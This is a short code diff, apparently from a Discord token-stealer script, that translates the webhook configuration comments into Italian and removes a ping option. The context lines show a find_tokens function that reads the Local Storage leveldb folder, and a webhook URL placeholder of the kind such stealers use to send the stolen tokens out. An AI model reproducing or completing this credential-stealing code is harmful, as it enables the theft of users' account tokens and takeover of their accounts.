@@ -4,11 +4,8 @@ import json
 
 from urllib.request import Request, urlopen
 
-# ur webhook URL
-WEBHOOK_URL = 'WEBHOOK HERE'
-
-# just a aMaZinG feature
-PING_ME = False
+# il tuo URL webhook
+WEBHOOK_URL = 'WEBHOOK QUI'
 
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
